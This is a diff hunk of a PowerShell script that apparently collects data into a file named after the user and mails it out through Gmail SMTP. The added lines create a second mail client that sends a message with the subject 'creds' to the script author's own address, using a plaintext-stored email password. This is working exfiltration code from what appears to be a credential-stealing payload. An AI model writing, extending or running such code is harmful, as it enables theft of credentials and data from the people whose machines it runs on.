@@ -46,6 +46,36 @@ Add-Content -Path $user_name -Value $temp_folder_path
 # smtp process
 Send-MailMessage -From $your_email -To $your_email -Subject $user_name -Attachment $user_name -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $your_email, (ConvertTo-SecureString -String $email_password -AsPlainText -Force))
 
+##################
+
+# Define email parameters
+$EmailFrom = $your_email 
+$EmailTo = $your_email 
+$Subject = "creds"
+$Body = "$user_name"
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = 587
+
+# Create the SMTP client
+$SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
+$SMTPClient.EnableSsl = $true
+
+# Set credentials securely
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($your_email, $email_password )
+
+# Create the email message
+$MailMessage = New-Object System.Net.Mail.MailMessage
+$MailMessage.From = $EmailFrom
+$MailMessage.To.Add($EmailTo)
+$MailMessage.Subject = $Subject
+$MailMessage.Body = $Body
+
+# Send the email
+$SMTPClient.Send($MailMessage)
+
+##################
+
+
 # goto temp, make working directory
 mkdir $temp_folder_path
 Set-Location $temp_folder_path
